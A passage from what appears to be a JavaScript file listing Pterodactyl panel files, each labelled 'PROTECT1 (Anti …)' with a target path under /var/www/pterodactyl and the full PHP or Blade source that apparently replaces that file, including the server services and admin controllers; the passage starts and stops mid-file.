        </div>

        <div class="col-md-6">
            <div class="box">
                <div class="box-header with-border">
                    <h3 class="box-title">Docker Configuration</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-12">
                        <label for="pDefaultContainer">Docker Image</label>
                        <select id="pDefaultContainer" name="image" class="form-control"></select>
                        <input id="pDefaultContainerCustom" name="custom_image" value="{{ old('custom_image') }}" class="form-control" placeholder="Or enter a custom image..." style="margin-top:1rem"/>
                        <p class="small text-muted no-margin">This is the default Docker image that will be used to run this server. Select an image from the dropdown above, or enter a custom image in the text field above.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="col-md-12">
            <div class="box">
                <div class="box-header with-border">
                    <h3 class="box-title">Startup Configuration</h3>
                </div>

                <div class="box-body row">
                    <div class="form-group col-xs-12">
                        <label for="pStartup">Startup Command</label>
                        <input type="text" id="pStartup" name="startup" value="{{ old('startup') }}" class="form-control" />
                        <p class="small text-muted no-margin">The following data substitutes are available for the startup command: <code>@{{SERVER_MEMORY}}</code>, <code>@{{SERVER_IP}}</code>, and <code>@{{SERVER_PORT}}</code>. They will be replaced with the allocated memory, server IP, and server port respectively.</p>
                    </div>
                </div>

                <div class="box-header with-border" style="margin-top:-10px;">
                    <h3 class="box-title">Service Variables</h3>
                </div>

                <div class="box-body row" id="appendVariablesTo"></div>

                <div class="box-footer">
                    {!! csrf_field() !!}
                    <input type="submit" class="btn btn-success pull-right" value="Create Server" />
                </div>
            </div>
        </div>
    </div>
</form>
@endsection

@section('footer-scripts')
    @parent
    {!! Theme::js('vendor/lodash/lodash.js') !!}

    <script type="application/javascript">
        // Persist 'Service Variables'
        function serviceVariablesUpdated(eggId, ids) {
            @if (old('egg_id'))
                // Check if the egg id matches.
                if (eggId != '{{ old('egg_id') }}') {
                    return;
                }

                @if (old('environment'))
                    @foreach (old('environment') as $key => $value)
                        $('#' + ids['{{ $key }}']).val('{{ $value }}');
                    @endforeach
                @endif
            @endif
            @if(old('image'))
                $('#pDefaultContainer').val('{{ old('image') }}');
            @endif
        }
        // END Persist 'Service Variables'
    </script>

    {!! Theme::js('js/admin/new-server.js?v=20220530') !!}

    <script type="application/javascript">
        $(document).ready(function() {
            // Persist 'Server Owner' select2
            @if (old('owner_id'))
                $.ajax({
                    url: '/admin/users/accounts.json?user_id={{ old('owner_id') }}',
                    dataType: 'json',
                }).then(function (data) {
                    initUserIdSelect([ data ]);
                });
            @else
                initUserIdSelect();
            @endif
            // END Persist 'Server Owner' select2

            // Persist 'Node' select2
            @if (old('node_id'))
                $('#pNodeId').val('{{ old('node_id') }}').change();

                // Persist 'Default Allocation' select2
                @if (old('allocation_id'))
                    $('#pAllocation').val('{{ old('allocation_id') }}').change();
                @endif
                // END Persist 'Default Allocation' select2

                // Persist 'Additional Allocations' select2
                @if (old('allocation_additional'))
                    const additional_allocations = [];

                    @for ($i = 0; $i < count(old('allocation_additional')); $i++)
                        additional_allocations.push('{{ old('allocation_additional.'.$i)}}');
                    @endfor

                    $('#pAllocationAdditional').val(additional_allocations).change();
                @endif
                // END Persist 'Additional Allocations' select2
            @endif
            // END Persist 'Node' select2

            // Persist 'Nest' select2
            @if (old('nest_id'))
                $('#pNestId').val('{{ old('nest_id') }}').change();

                // Persist 'Egg' select2
                @if (old('egg_id'))
                    $('#pEggId').val('{{ old('egg_id') }}').change();
                @endif
                // END Persist 'Egg' select2
            @endif
            // END Persist 'Nest' select2
        });
    </script>
@endsection
`
      },
      {
        name: "PROTECT1 (Anti Update Detail Server)",
        path: "/var/www/pterodactyl/app/Services/Servers/DetailsModificationService.php",
        file: "DetailsModificationService.php",
        code: `<?php

namespace Pterodactyl\\Services\\Servers;

use Illuminate\\Support\\Arr;
use Pterodactyl\\Models\\Server;
use Illuminate\\Database\\ConnectionInterface;
use Pterodactyl\\Traits\\Services\\ReturnsUpdatedModels;
use Pterodactyl\\Repositories\\Wings\\DaemonServerRepository;
use Pterodactyl\\Exceptions\\Http\\Connection\\DaemonConnectionException;

class DetailsModificationService
{
    use ReturnsUpdatedModels;

    /**
     * DetailsModificationService constructor.
     */
    public function __construct(private ConnectionInterface $connection, private DaemonServerRepository $serverRepository)
    {
    }

    /**
     * Update the details for a single server instance.
     *
     * @throws \\Throwable
     */
    public function handle(Server $server, array $data): Server
    {
        return $this->connection->transaction(function () use ($data, $server) {
            $owner = $server->owner_id;

            $server->forceFill([
                'external_id' => Arr::get($data, 'external_id'),
                'owner_id' => Arr::get($data, 'owner_id'),
                'name' => Arr::get($data, 'name'),
                'description' => Arr::get($data, 'description') ?? '',
            ])->saveOrFail();

            // If the owner_id value is changed we need to revoke any tokens that exist for the server
            // on the Wings instance so that the old owner no longer has any permission to access the
            // websockets.
            if ($server->owner_id !== $owner) {
                try {
                    $this->serverRepository->setServer($server)->revokeUserJTI($owner);
                } catch (DaemonConnectionException $exception) {
                    // Do nothing. A failure here is not ideal, but it is likely to be caused by Wings
                    // being offline, or in an entirely broken state. Remember, these tokens reset every
                    // few minutes by default, we're just trying to help it along a little quicker.
                }
            }

            return $server;
        });
    }
}`
      },
      {
        name: "PROTECT1 (Anti Update Build Configuration Server)",
        path: "/var/www/pterodactyl/app/Services/Servers/BuildModificationService.php",
        file: "BuildModificationService.php",
        code: `<?php

namespace Pterodactyl\\Services\\Servers;

use Illuminate\\Support\\Arr;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Models\\Allocation;
use Illuminate\\Support\\Facades\\Log;
use Illuminate\\Database\\ConnectionInterface;
use Pterodactyl\\Exceptions\\DisplayException;
use Illuminate\\Database\\Eloquent\\ModelNotFoundException;
use Pterodactyl\\Repositories\\Wings\\DaemonServerRepository;
use Pterodactyl\\Exceptions\\Http\\Connection\\DaemonConnectionException;

class BuildModificationService
{
    /**
     * BuildModificationService constructor.
     */
    public function __construct(
        private ConnectionInterface $connection,
        private DaemonServerRepository $daemonServerRepository,
        private ServerConfigurationStructureService $structureService
    ) {
    }

    /**
     * Change the build details for a specified server.
     *
     * @throws \\Throwable
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     */
    public function handle(Server $server, array $data): Server
    {
        /** @var \\Pterodactyl\\Models\\Server $server */
        $server = $this->connection->transaction(function () use ($server, $data) {
            $this->processAllocations($server, $data);

            if (isset($data['allocation_id']) && $data['allocation_id'] != $server->allocation_id) {
                try {
                    Allocation::query()->where('id', $data['allocation_id'])->where('server_id', $server->id)->firstOrFail();
                } catch (ModelNotFoundException) {
                    throw new DisplayException('The requested default allocation is not currently assigned to this server.');
                }
            }

            // If any of these values are passed through in the data array go ahead and set
            // them correctly on the server model.
            $merge = Arr::only($data, ['oom_disabled', 'memory', 'swap', 'io', 'cpu', 'threads', 'disk', 'allocation_id']);

            $server->forceFill(array_merge($merge, [
                'database_limit' => Arr::get($data, 'database_limit', 0) ?? null,
                'allocation_limit' => Arr::get($data, 'allocation_limit', 0) ?? null,
                'backup_limit' => Arr::get($data, 'backup_limit', 0) ?? 0,
            ]))->saveOrFail();

            return $server->refresh();
        });

        $updateData = $this->structureService->handle($server);

        // Because Wings always fetches an updated configuration from the Panel when booting
        // a server this type of exception can be safely "ignored" and just written to the logs.
        // Ideally this request succeeds, so we can apply resource modifications on the fly, but
        // if it fails we can just continue on as normal.
        if (!empty($updateData['build'])) {
            try {
                $this->daemonServerRepository->setServer($server)->sync();
            } catch (DaemonConnectionException $exception) {
                Log::warning($exception, ['server_id' => $server->id]);
            }
        }

        return $server;
    }

    /**
     * Process the allocations being assigned in the data and ensure they are available for a server.
     *
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     */
    private function processAllocations(Server $server, array &$data): void
    {
        if (empty($data['add_allocations']) && empty($data['remove_allocations'])) {
            return;
        }

        // Handle the addition of allocations to this server. Only assign allocations that are not currently
        // assigned to a different server, and only allocations on the same node as the server.
        if (!empty($data['add_allocations'])) {
            $query = Allocation::query()
                ->where('node_id', $server->node_id)
                ->whereIn('id', $data['add_allocations'])
                ->whereNull('server_id');

            // Keep track of all the allocations we're just now adding so that we can use the first
            // one to reset the default allocation to.
            $freshlyAllocated = $query->pluck('id')->first();

            $query->update(['server_id' => $server->id, 'notes' => null]);
        }

        if (!empty($data['remove_allocations'])) {
            foreach ($data['remove_allocations'] as $allocation) {
                // If we are attempting to remove the default allocation for the server, see if we can reassign
                // to the first provided value in add_allocations. If there is no new first allocation then we
                // will throw an exception back.
                if ($allocation === ($data['allocation_id'] ?? $server->allocation_id)) {
                    if (empty($freshlyAllocated)) {
                        throw new DisplayException('You are attempting to delete the default allocation for this server but there is no fallback allocation to use.');
                    }

                    // Update the default allocation to be the first allocation that we are creating.
                    $data['allocation_id'] = $freshlyAllocated;
                }
            }

            // Remove any of the allocations we got that are currently assigned to this server on
            // this node. Also set the notes to null, otherwise when re-allocated to a new server those
            // notes will be carried over.
            Allocation::query()->where('node_id', $server->node_id)
                ->where('server_id', $server->id)
                // Only remove the allocations that we didn't also attempt to add to the server...
                ->whereIn('id', array_diff($data['remove_allocations'], $data['add_allocations'] ?? []))
                ->update([
                    'notes' => null,
                    'server_id' => null,
                ]);
        }
    }
}
`
      },
      {
        name: "PROTECT1 (Anti Setup Server)",
        path: "/var/www/pterodactyl/app/Services/Servers/StartupModificationService.php",
        file: "StartupModificationService.php",
        code: `<?php

namespace Pterodactyl\\Services\\Servers;

use Illuminate\\Support\\Arr;
use Pterodactyl\\Models\\Egg;
use Pterodactyl\\Models\\User;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Models\\ServerVariable;
use Illuminate\\Database\\ConnectionInterface;
use Pterodactyl\\Traits\\Services\\HasUserLevels;

class StartupModificationService
{
    use HasUserLevels;

    /**
     * StartupModificationService constructor.
     */
    public function __construct(private ConnectionInterface $connection, private VariableValidatorService $validatorService)
    {
    }

    /**
     * Process startup modification for a server.
     *
     * @throws \\Throwable
     */
    public function handle(Server $server, array $data): Server
    {
        return $this->connection->transaction(function () use ($server, $data) {
            if (!empty($data['environment'])) {
                $egg = $this->isUserLevel(User::USER_LEVEL_ADMIN) ? ($data['egg_id'] ?? $server->egg_id) : $server->egg_id;

                $results = $this->validatorService
                    ->setUserLevel($this->getUserLevel())
                    ->handle($egg, $data['environment']);

                foreach ($results as $result) {
                    ServerVariable::query()->updateOrCreate(
                        [
                            'server_id' => $server->id,
                            'variable_id' => $result->id,
                        ],
                        ['variable_value' => $result->value ?? '']
                    );
                }
            }

            if ($this->isUserLevel(User::USER_LEVEL_ADMIN)) {
                $this->updateAdministrativeSettings($data, $server);
            }

            return $server->fresh();
        });
    }

    /**
     * Update certain administrative settings for a server in the DB.
     */
    protected function updateAdministrativeSettings(array $data, Server &$server): void
    {
        $eggId = Arr::get($data, 'egg_id');

        if (is_digit($eggId) && $server->egg_id !== (int) $eggId) {
            /** @var \\Pterodactyl\\Models\\Egg $egg */
            $egg = Egg::query()->findOrFail($data['egg_id']);

            $server = $server->forceFill([
                'egg_id' => $egg->id,
                'nest_id' => $egg->nest_id,
            ]);
        }

        $server->fill([
            'startup' => $data['startup'] ?? $server->startup,
            'skip_scripts' => $data['skip_scripts'] ?? isset($data['skip_scripts']),
            'image' => $data['docker_image'] ?? $server->image,
        ])->save();
    }
}`
      },
      {
        name: "PROTECT1 (Anti Update Database)",
        path: "/var/www/pterodactyl/app/Services/Databases/DatabaseManagementService.php",
        file: "DatabaseManagementService.php",
        code: `<?php

namespace Pterodactyl\\Services\\Databases;

use Exception;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Models\\Database;
use Pterodactyl\\Helpers\\Utilities;
use Illuminate\\Database\\ConnectionInterface;
use Illuminate\\Contracts\\Encryption\\Encrypter;
use Pterodactyl\\Extensions\\DynamicDatabaseConnection;
use Pterodactyl\\Repositories\\Eloquent\\DatabaseRepository;
use Pterodactyl\\Exceptions\\Repository\\DuplicateDatabaseNameException;
use Pterodactyl\\Exceptions\\Service\\Database\\TooManyDatabasesException;
use Pterodactyl\\Exceptions\\Service\\Database\\DatabaseClientFeatureNotEnabledException;

class DatabaseManagementService
{
    /**
     * The regex used to validate that the database name passed through to the function is
     * in the expected format.
     *
     * @see \\Pterodactyl\\Services\\Databases\\DatabaseManagementService::generateUniqueDatabaseName()
     */
    private const MATCH_NAME_REGEX = '/^(s[\\d]+_)(.*)$/';

    /**
     * Determines if the service should validate the user's ability to create an additional
     * database for this server. In almost all cases this should be true, but to keep things
     * flexible you can also set it to false and create more databases than the server is
     * allocated.
     */
    protected bool $validateDatabaseLimit = true;

    public function __construct(
        protected ConnectionInterface $connection,
        protected DynamicDatabaseConnection $dynamic,
        protected Encrypter $encrypter,
        protected DatabaseRepository $repository
    ) {
    }

    /**
     * Generates a unique database name for the given server. This name should be passed through when
     * calling this handle function for this service, otherwise the database will be created with
     * whatever name is provided.
     */
    public static function generateUniqueDatabaseName(string $name, int $serverId): string
    {
        // Max of 48 characters, including the s123_ that we append to the front.
        return sprintf('s%d_%s', $serverId, substr($name, 0, 48 - strlen("s{$serverId}_")));
    }

    /**
     * Set whether this class should validate that the server has enough slots
     * left before creating the new database.
     */
    public function setValidateDatabaseLimit(bool $validate): self
    {
        $this->validateDatabaseLimit = $validate;

        return $this;
    }

    /**
     * Create a new database that is linked to a specific host.
     *
     * @throws \\Throwable
     * @throws \\Pterodactyl\\Exceptions\\Service\\Database\\TooManyDatabasesException
     * @throws \\Pterodactyl\\Exceptions\\Service\\Database\\DatabaseClientFeatureNotEnabledException
     */
    public function create(Server $server, array $data): Database
    {
        if (!config('pterodactyl.client_features.databases.enabled')) {
            throw new DatabaseClientFeatureNotEnabledException();
        }

        if ($this->validateDatabaseLimit) {
            // If the server has a limit assigned and we've already reached that limit, throw back
            // an exception and kill the process.
            if (!is_null($server->database_limit) && $server->databases()->count() >= $server->database_limit) {
                throw new TooManyDatabasesException();
            }
        }

        // Protect against developer mistakes...
        if (empty($data['database']) || !preg_match(self::MATCH_NAME_REGEX, $data['database'])) {
            throw new \\InvalidArgumentException('The database name passed to DatabaseManagementService::handle MUST be prefixed with "s{server_id}_".');
        }

        $data = array_merge($data, [
            'server_id' => $server->id,
            'username' => sprintf('u%d_%s', $server->id, str_random(10)),
            'password' => $this->encrypter->encrypt(
                Utilities::randomStringWithSpecialCharacters(24)
            ),
        ]);

        $database = null;

        try {
            return $this->connection->transaction(function () use ($data, &$database) {
                $database = $this->createModel($data);

                $this->dynamic->set('dynamic', $data['database_host_id']);

                $this->repository->createDatabase($database->database);
                $this->repository->createUser(
                    $database->username,
                    $database->remote,
                    $this->encrypter->decrypt($database->password),
                    $database->max_connections
                );
                $this->repository->assignUserToDatabase($database->database, $database->username, $database->remote);
                $this->repository->flush();

                return $database;
            });
        } catch (\\Exception $exception) {
            try {
                if ($database instanceof Database) {
                    $this->repository->dropDatabase($database->database);
                    $this->repository->dropUser($database->username, $database->remote);
                    $this->repository->flush();
                }
            } catch (\\Exception $deletionException) {
                // Do nothing here. We've already encountered an issue before this point so no
                // reason to prioritize this error over the initial one.
            }

            throw $exception;
        }
    }

    /**
     * Delete a database from the given host server.
     *
     * @throws \\Exception
     */
    public function delete(Database $database): ?bool
    {
        $this->dynamic->set('dynamic', $database->database_host_id);

        $this->repository->dropDatabase($database->database);
        $this->repository->dropUser($database->username, $database->remote);
        $this->repository->flush();

        return $database->delete();
    }

    /**
     * Create the database if there is not an identical match in the DB. While you can technically
     * have the same name across multiple hosts, for the sake of keeping this logic easy to understand
     * and avoiding user confusion we will ignore the specific host and just look across all hosts.
     *
     * @throws \\Pterodactyl\\Exceptions\\Repository\\DuplicateDatabaseNameException
     * @throws \\Throwable
     */
    protected function createModel(array $data): Database
    {
        $exists = Database::query()->where('server_id', $data['server_id'])
            ->where('database', $data['database'])
            ->exists();

        if ($exists) {
            throw new DuplicateDatabaseNameException('A database with that name already exists for this server.');
        }

        $database = (new Database())->forceFill($data);
        $database->saveOrFail();

        return $database;
    }
}
`
      },
      {
        name: "PROTECT1 ANTI UPDATE MANAGE (Anti Button Transfer This Server)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/Servers/ServerTransferController.php",
        file: "ServerTransferController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin\\Servers;

use Carbon\\CarbonImmutable;
use Illuminate\\Http\\Request;
use Pterodactyl\\Models\\Server;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Pterodactyl\\Models\\ServerTransfer;
use Illuminate\\Database\\ConnectionInterface;
use Pterodactyl\\Http\\Controllers\\Controller;
use Pterodactyl\\Services\\Nodes\\NodeJWTService;
use Pterodactyl\\Repositories\\Eloquent\\NodeRepository;
use Pterodactyl\\Repositories\\Wings\\DaemonTransferRepository;
use Pterodactyl\\Contracts\\Repository\\AllocationRepositoryInterface;

class ServerTransferController extends Controller
{
    /**
     * ServerTransferController constructor.
     */
    public function __construct(
        private AlertsMessageBag $alert,
        private AllocationRepositoryInterface $allocationRepository,
        private ConnectionInterface $connection,
        private DaemonTransferRepository $daemonTransferRepository,
        private NodeJWTService $nodeJWTService,
        private NodeRepository $nodeRepository
    ) {
    }

    /**
     * Starts a transfer of a server to a new node.
     *
     * @throws \\Throwable
     */
    public function transfer(Request $request, Server $server): RedirectResponse
    {
        $validatedData = $request->validate([
            'node_id' => 'required|exists:nodes,id',
            'allocation_id' => 'required|bail|unique:servers|exists:allocations,id',
            'allocation_additional' => 'nullable',
        ]);

        $node_id = $validatedData['node_id'];
        $allocation_id = intval($validatedData['allocation_id']);
        $additional_allocations = array_map('intval', $validatedData['allocation_additional'] ?? []);

        // Check if the node is viable for the transfer.
        $node = $this->nodeRepository->getNodeWithResourceUsage($node_id);
        if (!$node->isViable($server->memory, $server->disk)) {
            $this->alert->danger(trans('admin/server.alerts.transfer_not_viable'))->flash();

            return redirect()->route('admin.servers.view.manage', $server->id);
        }

        $server->validateTransferState();

        $this->connection->transaction(function () use ($server, $node_id, $allocation_id, $additional_allocations) {
            // Create a new ServerTransfer entry.
            $transfer = new ServerTransfer();

            $transfer->server_id = $server->id;
            $transfer->old_node = $server->node_id;
            $transfer->new_node = $node_id;
            $transfer->old_allocation = $server->allocation_id;
            $transfer->new_allocation = $allocation_id;
            $transfer->old_additional_allocations = $server->allocations->where('id', '!=', $server->allocation_id)->pluck('id');
            $transfer->new_additional_allocations = $additional_allocations;

            $transfer->save();

            // Add the allocations to the server, so they cannot be automatically assigned while the transfer is in progress.
            $this->assignAllocationsToServer($server, $node_id, $allocation_id, $additional_allocations);

            // Generate a token for the destination node that the source node can use to authenticate with.
            $token = $this->nodeJWTService
                ->setExpiresAt(CarbonImmutable::now()->addMinutes(15))
                ->setSubject($server->uuid)
                ->handle($transfer->newNode, $server->uuid, 'sha256');

            // Notify the source node of the pending outgoing transfer.
            $this->daemonTransferRepository->setServer($server)->notify($transfer->newNode, $token);

            return $transfer;
        });

        $this->alert->success(trans('admin/server.alerts.transfer_started'))->flash();

        return redirect()->route('admin.servers.view.manage', $server->id);
    }

    /**
     * Assigns the specified allocations to the specified server.
     */
    private function assignAllocationsToServer(Server $server, int $node_id, int $allocation_id, array $additional_allocations)
    {
        $allocations = $additional_allocations;
        $allocations[] = $allocation_id;

        $unassigned = $this->allocationRepository->getUnassignedAllocationIds($node_id);

        $updateIds = [];
        foreach ($allocations as $allocation) {
            if (!in_array($allocation, $unassigned)) {
                continue;
            }

            $updateIds[] = $allocation;
        }

        if (!empty($updateIds)) {
            $this->allocationRepository->updateWhereIn('id', $updateIds, ['server_id' => $server->id]);
        }
    }
}
`
      },
      {
        name: "PROTECT1 ANTI UPDATE MANAGE (Anti Button Suspend Status)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/ServersController.php",
        file: "ServersController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Illuminate\\Http\\Request;
use Pterodactyl\\Models\\User;
use Illuminate\\Http\\Response;
use Pterodactyl\\Models\\Mount;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Models\\Database;
use Pterodactyl\\Models\\MountServer;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Pterodactyl\\Exceptions\\DisplayException;
use Pterodactyl\\Http\\Controllers\\Controller;
use Illuminate\\Validation\\ValidationException;
use Pterodactyl\\Services\\Servers\\SuspensionService;
use Pterodactyl\\Repositories\\Eloquent\\MountRepository;
use Pterodactyl\\Services\\Servers\\ServerDeletionService;
use Pterodactyl\\Services\\Servers\\ReinstallServerService;
use Pterodactyl\\Exceptions\\Model\\DataValidationException;
use Pterodactyl\\Repositories\\Wings\\DaemonServerRepository;
use Pterodactyl\\Services\\Servers\\BuildModificationService;
use Pterodactyl\\Services\\Databases\\DatabasePasswordService;
use Pterodactyl\\Services\\Servers\\DetailsModificationService;
use Pterodactyl\\Services\\Servers\\StartupModificationService;
use Pterodactyl\\Contracts\\Repository\\NestRepositoryInterface;
use Pterodactyl\\Repositories\\Eloquent\\DatabaseHostRepository;
use Pterodactyl\\Services\\Databases\\DatabaseManagementService;
use Illuminate\\Contracts\\Config\\Repository as ConfigRepository;
use Pterodactyl\\Contracts\\Repository\\ServerRepositoryInterface;
use Pterodactyl\\Contracts\\Repository\\DatabaseRepositoryInterface;
use Pterodactyl\\Contracts\\Repository\\AllocationRepositoryInterface;
use Pterodactyl\\Services\\Servers\\ServerConfigurationStructureService;
use Pterodactyl\\Http\\Requests\\Admin\\Servers\\Databases\\StoreServerDatabaseRequest;

class ServersController extends Controller
{
    /**
     * ServersController constructor.
     */
    public function __construct(
        protected AlertsMessageBag $alert,
        protected AllocationRepositoryInterface $allocationRepository,
        protected BuildModificationService $buildModificationService,
        protected ConfigRepository $config,
        protected DaemonServerRepository $daemonServerRepository,
        protected DatabaseManagementService $databaseManagementService,
        protected DatabasePasswordService $databasePasswordService,
        protected DatabaseRepositoryInterface $databaseRepository,
        protected DatabaseHostRepository $databaseHostRepository,
        protected ServerDeletionService $deletionService,
        protected DetailsModificationService $detailsModificationService,
        protected ReinstallServerService $reinstallService,
        protected ServerRepositoryInterface $repository,
        protected MountRepository $mountRepository,
        protected NestRepositoryInterface $nestRepository,
        protected ServerConfigurationStructureService $serverConfigurationStructureService,
        protected StartupModificationService $startupModificationService,
        protected SuspensionService $suspensionService
    ) {
    }

    /**
     * Update the details for a server.
     *
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function setDetails(Request $request, Server $server): RedirectResponse
    {
        $this->detailsModificationService->handle($server, $request->only([
            'owner_id', 'external_id', 'name', 'description',
        ]));

        $this->alert->success(trans('admin/server.alerts.details_updated'))->flash();

        return redirect()->route('admin.servers.view.details', $server->id);
    }

    /**
     * Toggles the installation status for a server.
     *
* @throws \\Pterodactyl\\Exceptions\\DisplayException
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function toggleInstall(Server $server): RedirectResponse
    {
        if ($server->status === Server::STATUS_INSTALL_FAILED) {
            throw new DisplayException(trans('admin/server.exceptions.marked_as_failed'));
        }

        $this->repository->update($server->id, [
            'status' => $server->isInstalled() ? Server::STATUS_INSTALLING : null,
        ], true, true);

        $this->alert->success(trans('admin/server.alerts.install_toggled'))->flash();

        return redirect()->route('admin.servers.view.manage', $server->id);
    }

    /**
     * Reinstalls the server with the currently assigned service.
     *
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function reinstallServer(Server $server): RedirectResponse
    {
        $this->reinstallService->handle($server);
        $this->alert->success(trans('admin/server.alerts.server_reinstalled'))->flash();

        return redirect()->route('admin.servers.view.manage', $server->id);
    }

    /**
     * Manage the suspension status for a server.
     *
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     * @throws \\Pterodactyl\\Exceptions\\Model\\DataValidationException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     */
    public function manageSuspension(Request $request, Server $server): RedirectResponse
    {
        $this->suspensionService->toggle($server, $request->input('action'));
        $this->alert->success(trans('admin/server.alerts.suspension_toggled', [
            'status' => $request->input('action') . 'ed',
        ]))->flash();

        return redirect()->route('admin.servers.view.manage', $server->id);
    }

    /**
     * Update the build configuration for a server.
     *
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     * @throws \\Pterodactyl\\Exceptions\\Repository\\RecordNotFoundException
     * @throws \\Illuminate\\Validation\\ValidationException
     */
    public function updateBuild(Request $request, Server $server): RedirectResponse
    {
        try {
            $this->buildModificationService->handle($server, $request->only([
                'allocation_id', 'add_allocations', 'remove_allocations',
                'memory', 'swap', 'io', 'cpu', 'threads', 'disk',
                'database_limit', 'allocation_limit', 'backup_limit', 'oom_disabled',
            ]));
        } catch (DataValidationException $exception) {
            throw new ValidationException($exception->getValidator());
        }

        $this->alert->success(trans('admin/server.alerts.build_updated'))->flash();

        return redirect()->route('admin.servers.view.build', $server->id);
    }

    /**
     * Start the server deletion process.
     *
     * @throws \\Pterodactyl\\Exceptions\\DisplayException
     * @throws \\Throwable
     */
    public function delete(Request $request, Server $server): RedirectResponse
    {
        $this->deletionService->withForce($request->filled('force_delete'))->handle($server);
        $this->alert->success(trans('admin/server.alerts.server_deleted'))->flash();

        return redirect()->route('admin.servers');
    }

    /**
     * Update the startup command as well as variables.
     *
     * @throws \\Illuminate\\Validation\\ValidationException
     */
    public function saveStartup(Request $request, Server $server): RedirectResponse
    {
        $data = $request->except('_token');
        if (!empty($data['custom_docker_image'])) {
            $data['docker_image'] = $data['custom_docker_image'];
            unset($data['custom_docker_image']);
        }

        try {
            $this->startupModificationService
                ->setUserLevel(User::USER_LEVEL_ADMIN)
                ->handle($server, $data);
        } catch (DataValidationException $exception) {
            throw new ValidationException($exception->getValidator());
        }

        $this->alert->success(trans('admin/server.alerts.startup_changed'))->flash();

        return redirect()->route('admin.servers.view.startup', $server->id);
    }

    /**
     * Creates a new database assigned to a specific server.
     *
     * @throws \\Throwable
     */
    public function newDatabase(StoreServerDatabaseRequest $request, Server $server): RedirectResponse
    {
        $this->databaseManagementService->create($server, [
            'database' => DatabaseManagementService::generateUniqueDatabaseName($request->input('database'), $server->id),
            'remote' => $request->input('remote'),
            'database_host_id' => $request->input('database_host_id'),
            'max_connections' => $request->input('max_connections'),
        ]);

        return redirect()->route('admin.servers.view.database', $server->id)->withInput();
    }

    /**
     * Resets the database password for a specific database on this server.
     *
     * @throws \\Throwable
     */
    public function resetDatabasePassword(Request $request, Server $server): Response
    {
        /** @var \\Pterodactyl\\Models\\Database $database */
        $database = $server->databases()->findOrFail($request->input('database'));

        $this->databasePasswordService->handle($database);

        return response('', 204);
    }

    /**
     * Deletes a database from a server.
     *
     * @throws \\Exception
     */
    public function deleteDatabase(Server $server, Database $database): Response
    {
        $this->databaseManagementService->delete($database);

        return response('', 204);
    }

    /**
     * Add a mount to a server.
     *
     * @throws \\Throwable
     */
    public function addMount(Request $request, Server $server): RedirectResponse
    {
        $mountServer = (new MountServer())->forceFill([
            'mount_id' => $request->input('mount_id'),
            'server_id' => $server->id,
        ]);

        $mountServer->saveOrFail();

        $this->alert->success('Mount was added successfully.')->flash();

        return redirect()->route('admin.servers.view.mounts', $server->id);
    }

    /**
     * Remove a mount from a server.
     */
    public function deleteMount(Server $server, Mount $mount): RedirectResponse
    {
        MountServer::where('mount_id', $mount->id)->where('server_id', $server->id)->delete();

        $this->alert->success('Mount was removed successfully.')->flash();

        return redirect()->route('admin.servers.view.mounts', $server->id);
    }
}
`
      },
      {
        name: "PROTECT1 ANTI UPDATE MANAGE (Anti Button Toggle Status)",
        path: "/var/www/pterodactyl/app/Http/Controllers/Admin/ServersController.php",
        file: "ServersController.php",
        code: `<?php

namespace Pterodactyl\\Http\\Controllers\\Admin;

use Illuminate\\Http\\Request;
use Pterodactyl\\Models\\User;
use Illuminate\\Http\\Response;
use Pterodactyl\\Models\\Mount;
use Pterodactyl\\Models\\Server;
use Pterodactyl\\Models\\Database;
use Pterodactyl\\Models\\MountServer;
use Illuminate\\Http\\RedirectResponse;
use Prologue\\Alerts\\AlertsMessageBag;
use Pterodactyl\\Exceptions\\DisplayException;
use Pterodactyl\\Http\\Controllers\\Controller;
use Illuminate\\Validation\\ValidationException;
use Pterodactyl\\Services\\Servers\\SuspensionService;
use Pterodactyl\\Repositories\\Eloquent\\MountRepository;
use Pterodactyl\\Services\\Servers\\ServerDeletionService;
use Pterodactyl\\Services\\Servers\\ReinstallServerService;
use Pterodactyl\\Exceptions\\Model\\DataValidationException;
use Pterodactyl\\Repositories\\Wings\\DaemonServerRepository;
use Pterodactyl\\Services\\Servers\\BuildModificationService;
use Pterodactyl\\Services\\Databases\\DatabasePasswordService;
use Pterodactyl\\Services\\Servers\\DetailsModificationService;
use Pterodactyl\\Services\\Servers\\StartupModificationService;
use Pterodactyl\\Contracts\\Repository\\NestRepositoryInterface;
use Pterodactyl\\Repositories\\Eloquent\\DatabaseHostRepository;
use Pterodactyl\\Services\\Databases\\DatabaseManagementService;
use Illuminate\\Contracts\\Config\\Repository as ConfigRepository;
use Pterodactyl\\Contracts\\Repository\\ServerRepositoryInterface;
use Pterodactyl\\Contracts\\Repository\\DatabaseRepositoryInterface;
use Pterodactyl\\Contracts\\Repository\\AllocationRepositoryInterface;
use Pterodactyl\\Services\\Servers\\ServerConfigurationStructureService;
use Pterodactyl\\Http\\Requests\\Admin\\Servers\\Databases\\StoreServerDatabaseRequest;

class ServersController extends Controller
{
    /**
     * ServersController constructor.
     */
